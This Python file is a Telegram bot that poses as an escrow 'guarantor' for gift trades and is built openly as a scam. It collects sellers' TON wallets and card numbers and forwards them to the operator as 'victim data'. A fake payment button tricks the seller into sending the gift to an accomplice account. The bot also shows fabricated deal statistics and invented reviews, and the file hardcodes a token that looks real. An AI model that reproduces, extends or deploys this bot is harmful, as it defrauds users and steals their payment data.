import logging
import asyncio
import random
import string
import sqlite3
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage

# ================== КОНФИГУРАЦИЯ ==================
BOT_TOKEN = "8477920514:AAFL7om34i_6NeLByv0LrydZOjiG2N9VV4o"  # Замени на свой
ADMIN_IDS = [8146320391]  # Твой Telegram ID

# Фейковые данные для сбора
FAKE_WALLET = "UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
FAKE_CARD = "4400 4303 3902 3597"

# Юзер для передачи подарка (твой сообщник или фейк)
GIFT_RECEIVER = "@otc_elff"

# Валюты
CURRENCIES = {
    "STARS": "⭐ Telegram Stars",
    "TON": "💎 TON",
    "RUB": "₽ Рубли",
    "KZT": "₸ Тенге",
    "USD": "$ Доллары"
}

# Логирование
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== БАЗА ДАННЫХ ==================
def init_db():
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    
    # Пользователи
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  first_name TEXT,
                  wallet_address TEXT,
                  card_number TEXT,
                  registered_at TEXT)''')
    
    # Сделки
    c.execute('''CREATE TABLE IF NOT EXISTS deals
                 (deal_id TEXT PRIMARY KEY,
                  seller_id INTEGER,
                  buyer_id INTEGER,
                  amount REAL,
                  currency TEXT,
                  status TEXT DEFAULT 'waiting_buyer',
                  created_at TEXT,
                  completed_at TEXT,
                  seller_confirmed INTEGER DEFAULT 0,
                  buyer_confirmed INTEGER DEFAULT 0)''')
    
    # Админы
    c.execute('''CREATE TABLE IF NOT EXISTS admins
                 (user_id INTEGER PRIMARY KEY,
                  added_by INTEGER,
                  added_at TEXT)''')
    
    # Статистика (фейковая)
    c.execute('''CREATE TABLE IF NOT EXISTS stats
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  total_deals INTEGER DEFAULT 1547,
                  total_users INTEGER DEFAULT 2341,
                  total_volume REAL DEFAULT 45890.5)''')
    
    # Добавляем первого админа
    try:
        for admin_id in ADMIN_IDS:
            c.execute('INSERT OR IGNORE INTO admins (user_id, added_by, added_at) VALUES (?, ?, ?)',
                      (admin_id, 0, datetime.now().isoformat()))
    except:
        pass
    
    conn.commit()
    conn.close()

init_db()

# ================== СОСТОЯНИЯ FSM ==================
class DealStates(StatesGroup):
    waiting_for_amount = State()
    waiting_for_currency = State()
    waiting_for_wallet = State()
    waiting_for_card = State()

class AdminStates(StatesGroup):
    waiting_for_new_admin = State()
    waiting_for_stats_value = State()

# ================== ИНИЦИАЛИЗАЦИЯ ==================
bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# ================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==================
def generate_deal_id():
    """Генерация ID сделки"""
    return 'DEAL-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def is_admin(user_id):
    """Проверка на админа"""
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('SELECT user_id FROM admins WHERE user_id = ?', (user_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def add_user(user_id, username, first_name):
    """Добавление пользователя"""
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('''INSERT OR IGNORE INTO users (user_id, username, first_name, registered_at)
                 VALUES (?, ?, ?, ?)''',
              (user_id, username, first_name, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def update_user_wallet(user_id, wallet):
    """Обновление кошелька пользователя"""
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('UPDATE users SET wallet_address = ? WHERE user_id = ?', (wallet, user_id))
    conn.commit()
    conn.close()

def update_user_card(user_id, card):
    """Обновление карты пользователя"""
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('UPDATE users SET card_number = ? WHERE user_id = ?', (card, user_id))
    conn.commit()
    conn.close()

def create_deal(seller_id, amount, currency):
    """Создание сделки (продавец)"""
    deal_id = generate_deal_id()
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('''INSERT INTO deals (deal_id, seller_id, amount, currency, created_at)
                 VALUES (?, ?, ?, ?, ?)''',
              (deal_id, seller_id, amount, currency, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return deal_id

def get_deal(deal_id):
    """Получение сделки по ID"""
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('SELECT * FROM deals WHERE deal_id = ?', (deal_id,))
    deal = c.fetchone()
    conn.close()
    return deal

def update_deal_buyer(deal_id, buyer_id):
    """Обновление покупателя в сделке"""
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('UPDATE deals SET buyer_id = ?, status = "waiting_payment" WHERE deal_id = ?',
              (buyer_id, deal_id))
    conn.commit()
    conn.close()

def update_deal_status(deal_id, status):
    """Обновление статуса сделки"""
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('UPDATE deals SET status = ? WHERE deal_id = ?', (status, deal_id))
    conn.commit()
    conn.close()

def confirm_seller(deal_id):
    """Продавец подтверждает получение оплаты"""
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('UPDATE deals SET seller_confirmed = 1, status = "item_transfer" WHERE deal_id = ?',
              (deal_id,))
    conn.commit()
    conn.close()

def confirm_buyer_received(deal_id):
    """Покупатель подтверждает получение подарка"""
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('''UPDATE deals SET buyer_confirmed = 1, status = "completed", completed_at = ? 
                 WHERE deal_id = ?''',
              (datetime.now().isoformat(), deal_id))
    conn.commit()
    conn.close()

def get_stats():
    """Получение фейковой статистики"""
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('SELECT total_deals, total_users, total_volume FROM stats ORDER BY id DESC LIMIT 1')
    stats = c.fetchone()
    conn.close()
    
    if stats:
        return stats
    return (1547, 2341, 45890.5)

def update_stats(deals=None, users=None, volume=None):
    """Обновление статистики (админка)"""
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    current = get_stats()
    
    new_deals = deals if deals is not None else current[0]
    new_users = users if users is not None else current[1]
    new_volume = volume if volume is not None else current[2]
    
    c.execute('INSERT INTO stats (total_deals, total_users, total_volume) VALUES (?, ?, ?)',
              (new_deals, new_users, new_volume))
    conn.commit()
    conn.close()

# ================== КЛАВИАТУРЫ ==================
def main_keyboard(user_id):
    """Основная клавиатура"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("💰 Продать (создать сделку)", callback_data="sell"),
        InlineKeyboardButton("🛒 Купить (войти в сделку)", callback_data="buy")
    )
    keyboard.add(
        InlineKeyboardButton("👤 Мой профиль", callback_data="profile"),
        InlineKeyboardButton("⭐ Отзывы", callback_data="reviews")
    )
    
    if is_admin(user_id):
        keyboard.add(InlineKeyboardButton("⚙️ Админ панель", callback_data="admin_panel"))
    
    return keyboard

def currency_keyboard():
    """Выбор валюты"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    buttons = []
    for code, name in CURRENCIES.items():
        buttons.append(InlineKeyboardButton(name, callback_data=f"curr_{code}"))
    keyboard.add(*buttons)
    return keyboard

def deal_link_keyboard(deal_id):
    """Кнопка со ссылкой на сделку"""
    keyboard = InlineKeyboardMarkup()
    # Ссылка будет сгенерирована в обработчике
    return keyboard

def payment_keyboard(deal_id):
    """Кнопка оплаты для покупателя (мошенника)"""
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("✅ Оплатить (фейк)", callback_data=f"pay_{deal_id}"))
    return keyboard

def seller_confirm_keyboard(deal_id):
    """Подтверждение от продавца (жертвы)"""
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("✅ Я получил оплату", callback_data=f"seller_confirm_{deal_id}"))
    return keyboard

def transfer_keyboard(deal_id):
    """Подтверждение передачи подарка"""
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("✅ Я передал подарок", callback_data=f"transfer_{deal_id}"))
    return keyboard

def buyer_received_keyboard(deal_id):
    """Покупатель подтверждает получение"""
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("✅ Я получил подарок", callback_data=f"receive_{deal_id}"))
    return keyboard

def admin_keyboard():
    """Админ панель"""
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
        InlineKeyboardButton("👥 Пользователи", callback_data="admin_users"),
        InlineKeyboardButton("📈 Изменить статистику", callback_data="admin_edit_stats"),
        InlineKeyboardButton("➕ Добавить админа", callback_data="admin_add"),
        InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")
    )
    return keyboard

# ================== ОБРАБОТЧИКИ ==================
@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    """Обработка /start"""
    user_id = message.from_user.id
    username = message.from_user.username or "нет"
    first_name = message.from_user.first_name or "Пользователь"
    
    add_user(user_id, username, first_name)
    
    # Проверка на вход в сделку (покупатель)
    args = message.get_args()
    if args and args.startswith("deal_"):
        deal_id = args.replace("deal_", "")
        deal = get_deal(deal_id)
        
        if deal and deal[2] is None:  # buyer_id пустой
            update_deal_buyer(deal_id, user_id)
            
            await message.answer(
                f"🔐 <b>Вход в сделку #{deal_id}</b>\n\n"
                f"💰 Сумма: {deal[3]} {deal[4]}\n"
                f"👤 Продавец: ID {deal[1]}\n\n"
                f"📋 <b>Инструкция:</b>\n"
                f"1. Нажми кнопку оплаты ниже\n"
                f"2. После подтверждения продавца получите подарок\n"
                f"3. Подтвердите получение\n\n"
                f"⚠️ Средства зарезервированы гарантом",
                reply_markup=payment_keyboard(deal_id)
            )
            return
    
    # Обычный старт
    total_deals, total_users, total_volume = get_stats()
    
    await message.answer(
        f"👋 <b>Добро пожаловать в OTC Гарант!</b>\n\n"
        f"📊 <b>Статистика:</b>\n"
        f"✅ Сделок: {total_deals:,}\n"
        f"👥 Пользователей: {total_users:,}\n"
        f"💰 Объем: ${total_volume:,.0f}\n\n"
        f"🔒 Безопасные сделки через гаранта\n"
        f"⭐ Работаем с {', '.join(CURRENCIES.values())}",
        reply_markup=main_keyboard(user_id)
    )

@dp.callback_query_handler(text="profile")
async def show_profile(call: types.CallbackQuery):
    """Профиль пользователя"""
    user_id = call.from_user.id
    
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    c.execute('SELECT wallet_address, card_number FROM users WHERE user_id = ?', (user_id,))
    user = c.fetchone()
    c.execute('SELECT COUNT(*) FROM deals WHERE seller_id = ? OR buyer_id = ?', (user_id, user_id))
    deals_count = c.fetchone()[0]
    conn.close()
    
    wallet = user[0] if user and user[0] else "❌ Не добавлен"
    card = user[1] if user and user[1] else "❌ Не добавлена"
    
    text = (
        f"👤 <b>Ваш профиль</b>\n\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"👤 Username: @{call.from_user.username or 'нет'}\n"
        f"📊 Сделок: {deals_count}\n\n"
        f"💳 <b>Платежные данные:</b>\n"
        f"TON кошелек: <code>{wallet}</code>\n"
        f"Карта: <code>{card}</code>\n\n"
        f"✏️ Для изменения данных создайте сделку"
    )
    
    await call.message.edit_text(text, reply_markup=main_keyboard(user_id))

@dp.callback_query_handler(text="reviews")
async def show_reviews(call: types.CallbackQuery):
    """Фейковые отзывы"""
    text = (
        "⭐ <b>Отзывы наших клиентов</b>\n\n"
        "@crypto_king: \"Продал подарок за 200 TON, деньги через 2 часа\" ★★★★★\n"
        "@nft_lover: \"Лучший гарант, уже 5 сделок\" ★★★★★\n"
        "@ton_trader: \"Быстро и надежно\" ★★★★★\n"
        "@gift_seller: \"Спасибо, выручили\" ★★★★★\n"
        "@whale_ton: \"Топ бот, всем советую\" ★★★★★\n\n"
        "📈 <b>Всего отзывов:</b> 1,234\n"
        "⭐ <b>Рейтинг:</b> 4.98/5"
    )
    
    await call.message.edit_text(text, reply_markup=main_keyboard(call.from_user.id))

@dp.callback_query_handler(text="sell")
async def sell_start(call: types.CallbackQuery, state: FSMContext):
    """Продажа - создание сделки (продавец - жертва)"""
    await call.message.edit_text(
        "💰 <b>Продажа подарка</b>\n\n"
        "Введите сумму сделки в выбранной валюте:",
        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_main"))
    )
    await state.set_state(DealStates.waiting_for_amount)

@dp.message_handler(state=DealStates.waiting_for_amount)
async def process_amount(message: types.Message, state: FSMContext):
    """Обработка суммы"""
    try:
        amount = float(message.text.replace(',', '.'))
        if amount <= 0:
            raise ValueError
    except:
        await message.answer("❌ Введите корректное число")
        return
    
    await state.update_data(amount=amount)
    
    await message.answer(
        "💱 <b>Выберите валюту:</b>",
        reply_markup=currency_keyboard()
    )
    await state.set_state(DealStates.waiting_for_currency)

@dp.callback_query_handler(lambda c: c.data.startswith('curr_'), state=DealStates.waiting_for_currency)
async def process_currency(call: types.CallbackQuery, state: FSMContext):
    """Обработка валюты"""
    currency = call.data.replace('curr_', '')
    
    await state.update_data(currency=currency)
    
    await call.message.edit_text(
        f"💳 <b>Добавьте платежные данные</b>\n\n"
        f"Для получения выплат укажите ваш TON кошелек:",
        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_main"))
    )
    await state.set_state(DealStates.waiting_for_wallet)

@dp.message_handler(state=DealStates.waiting_for_wallet)
async def process_wallet(message: types.Message, state: FSMContext):
    """Обработка кошелька"""
    wallet = message.text.strip()
    
    await state.update_data(wallet=wallet)
    
    await message.answer(
        "💳 <b>Добавьте номер карты</b>\n\n"
        "Для вывода средств укажите карту:",
        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_main"))
    )
    await state.set_state(DealStates.waiting_for_card)

@dp.message_handler(state=DealStates.waiting_for_card)
async def process_card(message: types.Message, state: FSMContext):
    """Финальное создание сделки продавцом"""
    card = message.text.strip()
    
    data = await state.get_data()
    amount = data['amount']
    currency = data['currency']
    wallet = data['wallet']
    
    user_id = message.from_user.id
    
    # Сохраняем данные пользователя
    update_user_wallet(user_id, wallet)
    update_user_card(user_id, card)
    
    # Создаем сделку
    deal_id = create_deal(user_id, amount, currency)
    
    # Отправляем админу уведомление (сбор данных)
    await bot.send_message(
        ADMIN_IDS[0],
        f"💰 <b>НОВАЯ СДЕЛКА + ДАННЫЕ ЖЕРТВЫ</b>\n\n"
        f"👤 Продавец: @{message.from_user.username}\n"
        f"🆔 ID: {user_id}\n"
        f"💎 TON: {wallet}\n"
        f"💳 Карта: {card}\n"
        f"📊 Сумма: {amount} {currency}\n"
        f"🔗 Сделка: {deal_id}"
    )
    
    # Создаем ссылку для покупателя (мошенника)
    bot_username = (await bot.me).username
    deal_link = f"https://t.me/{bot_username}?start=deal_{deal_id}"
    
    await message.answer(
        f"✅ <b>Сделка создана!</b>\n\n"
        f"🔑 <b>ID сделки:</b> <code>{deal_id}</code>\n"
        f"💰 <b>Сумма:</b> {amount} {currency}\n\n"
        f"📤 <b>Отправьте эту ссылку покупателю:</b>\n"
        f"{deal_link}\n\n"
        f"<b>Как только покупатель оплатит, вы получите уведомление</b>",
        reply_markup=main_keyboard(user_id)
    )
    
    await state.finish()

@dp.callback_query_handler(text="buy")
async def buy_start(call: types.CallbackQuery):
    """Покупка - вход в сделку (покупатель - мошенник)"""
    await call.message.edit_text(
        "🔐 <b>Вход в сделку</b>\n\n"
        "Введите ID сделки, который отправил продавец:",
        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Отмена", callback_data="back_to_main"))
    )

# Этот хендлер уже есть в /start, но можно добавить обработчик для ручного ввода
@dp.message_handler(lambda message: message.text and message.text.startswith('DEAL-'))
async def manual_enter_deal(message: types.Message):
    """Ручной ввод ID сделки"""
    deal_id = message.text.strip()
    deal = get_deal(deal_id)
    
    if not deal:
        await message.answer("❌ Сделка не найдена")
        return
    
    if deal[2] is not None:
        await message.answer("❌ У этой сделки уже есть покупатель")
        return
    
    update_deal_buyer(deal_id, message.from_user.id)
    
    await message.answer(
        f"🔐 <b>Вход в сделку #{deal_id}</b>\n\n"
        f"💰 Сумма: {deal[3]} {deal[4]}\n"
        f"👤 Продавец: ID {deal[1]}\n\n"
        f"📋 <b>Инструкция:</b>\n"
        f"1. Нажми кнопку оплаты ниже\n"
        f"2. После подтверждения продавца получите подарок\n"
        f"3. Подтвердите получение\n\n"
        f"⚠️ Средства зарезервированы гарантом",
        reply_markup=payment_keyboard(deal_id)
    )

@dp.callback_query_handler(lambda c: c.data.startswith('pay_'))
async def process_payment(call: types.CallbackQuery):
    """Покупатель нажимает оплатить (фейк)"""
    deal_id = call.data.replace('pay_', '')
    deal = get_deal(deal_id)
    
    if not deal:
        await call.answer("Сделка не найдена", show_alert=True)
        return
    
    # Обновляем статус
    update_deal_status(deal_id, "paid")
    
    await call.message.edit_text(
        f"✅ <b>Оплата выполнена!</b>\n\n"
        f"🔑 Сделка: {deal_id}\n"
        f"💰 Сумма: {deal[3]} {deal[4]}\n\n"
        f"⏳ <b>Ожидаем подтверждения от продавца...</b>\n\n"
        f"Как только продавец подтвердит получение оплаты, вы сможете получить подарок",
        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔄 Проверить статус", callback_data=f"status_{deal_id}"))
    )
    
    # Уведомляем продавца (жертву)
    await bot.send_message(
        deal[1],  # seller_id
        f"✅ <b>Покупатель оплатил сделку!</b>\n\n"
        f"🔑 Сделка: {deal_id}\n"
        f"💰 Сумма: {deal[3]} {deal[4]}\n\n"
        f"📦 <b>Подтвердите получение оплаты</b>\n"
        f"и передайте подарок {GIFT_RECEIVER}",
        reply_markup=seller_confirm_keyboard(deal_id)
    )
    
    # Лог для админа
    await bot.send_message(
        ADMIN_IDS[0],
        f"💸 <b>ПОКУПАТЕЛЬ НАЖАЛ ОПЛАТУ</b>\n\n"
        f"🔑 Сделка: {deal_id}\n"
        f"👤 Продавец (жертва): ID {deal[1]}\n"
        f"👤 Покупатель (мошенник): @{call.from_user.username}"
    )

@dp.callback_query_handler(lambda c: c.data.startswith('seller_confirm_'))
async def seller_confirm_payment(call: types.CallbackQuery):
    """Продавец подтверждает получение оплаты"""
    deal_id = call.data.replace('seller_confirm_', '')
    deal = get_deal(deal_id)
    
    if not deal:
        await call.answer("Сделка не найдена", show_alert=True)
        return
    
    confirm_seller(deal_id)
    
    await call.message.edit_text(
        f"✅ <b>Подтверждение получено!</b>\n\n"
        f"🔑 Сделка: {deal_id}\n\n"
        f"📦 <b>Теперь передайте подарок гаранту:</b>\n"
        f"{GIFT_RECEIVER}\n\n"
        f"⚠️ После передачи нажмите кнопку ниже",
        reply_markup=transfer_keyboard(deal_id)
    )
    
    # Уведомляем покупателя (мошенника)
    await bot.send_message(
        deal[2],  # buyer_id
        f"✅ <b>Продавец подтвердил оплату!</b>\n\n"
        f"🔑 Сделка: {deal_id}\n\n"
        f"⏳ Ожидайте передачи подарка от продавца\n"
        f"гаранту {GIFT_RECEIVER}",
        reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔄 Проверить статус", callback_data=f"status_{deal_id}")
        )
    )

@dp.callback_query_handler(lambda c: c.data.startswith('transfer_'))
async def transfer_gift(call: types.CallbackQuery):
    """Продавец передал подарок"""
    deal_id = call.data.replace('transfer_', '')
    
    await call.message.edit_text(
        f"✅ <b>Заявка на передачу принята!</b>\n\n"
        f"🔑 Сделка: {deal_id}\n\n"
        f"⏳ <b>Ожидаем подтверждения от покупателя...</b>\n\n"
        f"Как только покупатель подтвердит получение подарка,\n"
        f"деньги поступят на ваш кошелек в течение 2-3 часов.",
        reply_markup=main_keyboard(call.from_user.id)
    )
    
    # Уведомляем покупателя (мошенника)
    deal = get_deal(deal_id)
    await bot.send_message(
        deal[2],  # buyer_id
        f"📦 <b>Продавец передал подарок гаранту!</b>\n\n"
        f"🔑 Сделка: {deal_id}\n\n"
        f"✅ <b>Подтвердите получение подарка</b>\n"
        f"(подарок должен быть у вас в {GIFT_RECEIVER})",
        reply_markup=buyer_received_keyboard(deal_id)
    )

@dp.callback_query_handler(lambda c: c.data.startswith('receive_'))
async def buyer_received(call: types.CallbackQuery):
    """Покупатель подтвердил получение подарка"""
    deal_id = call.data.replace('receive_', '')
    deal = get_deal(deal_id)
    
    if not deal:
        await call.answer("Сделка не найдена", show_alert=True)
        return
    
    confirm_buyer_received(deal_id)
    
    await call.message.edit_text(
        f"✅ <b>Сделка завершена!</b>\n\n"
        f"🔑 Сделка: {deal_id}\n\n"
        f"🎁 Подарок получен покупателем\n"
        f"💰 Деньги зарезервированы для продавца\n\n"
        f"⚡ Выплата продавцу через 2-3 часа",
        reply_markup=main_keyboard(call.from_user.id)
    )
    
    # Уведомляем продавца (жертву)
    await bot.send_message(
        deal[1],  # seller_id
        f"✅ <b>Покупатель подтвердил получение подарка!</b>\n\n"
        f"🔑 Сделка: {deal_id}\n\n"
        f"💰 <b>Деньги поступят в течение 2-3 часов</b>\n"
        f"на указанные вами реквизиты.\n\n"
        f"📞 По всем вопросам: @support_fake",
        reply_markup=main_keyboard(deal[1])
    )
    
    # Отправляем админу отчет об успешном скаме
    await bot.send_message(
        ADMIN_IDS[0],
        f"✅ <b>СКАМ УСПЕШЕН!</b>\n\n"
        f"🔑 Сделка: {deal_id}\n"
        f"💰 Сумма: {deal[3]} {deal[4]}\n"
        f"👤 Продавец (жертва): ID {deal[1]}\n"
        f"👤 Покупатель (мошенник): ID {deal[2]}\n\n"
        f"🎁 Подарок у мошенника\n"
        f"⚡ Жертва ждет деньги 2-3 часа"
    )

@dp.callback_query_handler(lambda c: c.data.startswith('status_'))
async def check_status(call: types.CallbackQuery):
    """Проверка статуса сделки"""
    deal_id = call.data.replace('status_', '')
    deal = get_deal(deal_id)
    
    if not deal:
        await call.answer("Сделка не найдена", show_alert=True)
        return
    
    status_text = {
        "waiting_buyer": "⏳ Ожидание покупателя",
        "waiting_payment": "⏳ Ожидание оплаты",
        "paid": "✅ Оплачено, ожидание подтверждения",
        "item_transfer": "📦 Передача подарка",
        "completed": "✅ Сделка завершена"
    }.get(deal[5], "❓ Неизвестный статус")
    
    await call.message.answer(
        f"📊 <b>Статус сделки {deal_id}</b>\n\n"
        f"💰 Сумма: {deal[3]} {deal[4]}\n"
        f"📌 Статус: {status_text}",
        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_main"))
    )

# ================== АДМИН ПАНЕЛЬ ==================
@dp.callback_query_handler(text="admin_panel")
async def admin_panel(call: types.CallbackQuery):
    """Админ панель"""
    if not is_admin(call.from_user.id):
        await call.answer("❌ Доступ запрещен", show_alert=True)
        return
    
    await call.message.edit_text(
        "⚙️ <b>Админ панель</b>\n\n"
        "Выберите действие:",
        reply_markup=admin_keyboard()
    )

@dp.callback_query_handler(text="admin_stats")
async def admin_stats(call: types.CallbackQuery):
    """Статистика для админа"""
    if not is_admin(call.from_user.id):
        return
    
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    
    total_users = c.execute('SELECT COUNT(*) FROM users').fetchone()[0]
    total_deals = c.execute('SELECT COUNT(*) FROM deals').fetchone()[0]
    completed = c.execute('SELECT COUNT(*) FROM deals WHERE status = "completed"').fetchone()[0]
    pending = c.execute('SELECT COUNT(*) FROM deals WHERE status != "completed"').fetchone()[0]
    
    c.execute('SELECT SUM(amount) FROM deals WHERE currency = "TON"')
    ton_volume = c.fetchone()[0] or 0
    
    conn.close()
    
    text = (
        f"📊 <b>Детальная статистика</b>\n\n"
        f"👥 Пользователей: {total_users}\n"
        f"📈 Всего сделок: {total_deals}\n"
        f"✅ Завершено (скамов): {completed}\n"
        f"⏳ В процессе: {pending}\n"
        f"💎 TON объем: {ton_volume:.2f}\n\n"
        f"📊 Фейковая статистика (для юзеров)\n"
        f"• Сделок: 1,547\n"
        f"• Пользователей: 2,341\n"
        f"• Объем: $45,890"
    )
    
    await call.message.edit_text(text, reply_markup=admin_keyboard())

@dp.callback_query_handler(text="admin_users")
async def admin_users(call: types.CallbackQuery):
    """Список пользователей"""
    if not is_admin(call.from_user.id):
        return
    
    conn = sqlite3.connect('scam_garant.db')
    c = conn.cursor()
    users = c.execute('SELECT user_id, username, first_name, wallet_address, card_number FROM users ORDER BY user_id DESC LIMIT 10').fetchall()
    conn.close()
    
    text = "👥 <b>Последние 10 пользователей:</b>\n\n"
    for user in users:
        text += f"🆔 <code>{user[0]}</code> | @{user[1] or 'нет'}\n"
        text += f"💎 {user[3] or 'нет'} | 💳 {user[4] or 'нет'}\n\n"
    
    await call.message.edit_text(text, reply_markup=admin_keyboard())

@dp.callback_query_handler(text="admin_edit_stats")
async def admin_edit_stats(call: types.CallbackQuery, state: FSMContext):
    """Изменение статистики"""
    if not is_admin(call.from_user.id):
        return
    
    await call.message.edit_text(
        "📊 <b>Изменение статистики</b>\n\n"
        "Введите новые значения в формате:\n"
        "<code>сделки пользователи объем</code>\n\n"
        "Пример: <code>2000 3000 50000</code>",
        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Назад", callback_data="admin_panel"))
    )
    await state.set_state(AdminStates.waiting_for_stats_value)

@dp.message_handler(state=AdminStates.waiting_for_stats_value)
async def process_stats_update(message: types.Message, state: FSMContext):
    """Обработка изменения статистики"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        deals, users, volume = map(float, message.text.split())
        update_stats(int(deals), int(users), volume)
        await message.answer("✅ Статистика обновлена")
    except:
        await message.answer("❌ Неверный формат")
    
    await state.finish()
    await cmd_start(message)

@dp.callback_query_handler(text="admin_add")
async def admin_add_start(call: types.CallbackQuery, state: FSMContext):
    """Добавление админа"""
    if not is_admin(call.from_user.id):
        return
    
    await call.message.edit_text(
        "➕ <b>Добавление админа</b>\n\n"
        "Введите Telegram ID нового админа:",
        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Назад", callback_data="admin_panel"))
    )
    await state.set_state(AdminStates.waiting_for_new_admin)

@dp.message_handler(state=AdminStates.waiting_for_new_admin)
async def admin_add_process(message: types.Message, state: FSMContext):
    """Обработка добавления админа"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        new_admin_id = int(message.text)
        
        conn = sqlite3.connect('scam_garant.db')
        c = conn.cursor()
        c.execute('INSERT OR IGNORE INTO admins (user_id, added_by, added_at) VALUES (?, ?, ?)',
                  (new_admin_id, message.from_user.id, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        await message.answer(f"✅ Админ {new_admin_id} добавлен")
    except:
        await message.answer("❌ Введите корректный ID")
    
    await state.finish()
    await cmd_start(message)

@dp.callback_query_handler(text="back_to_main")
async def back_to_main(call: types.CallbackQuery, state: FSMContext = None):
    """Возврат в главное меню"""
    if state:
        await state.finish()
    await cmd_start(call.message)

# ================== ЗАПУСК ==================
if __name__ == "__main__":
    print("🤖 OTC Гарант Бот запущен...")
    print("👤 Продавец создает сделку -> Покупатель оплачивает (фейк) -> Скам")
    executor.start_polling(dp, skip_updates=True)
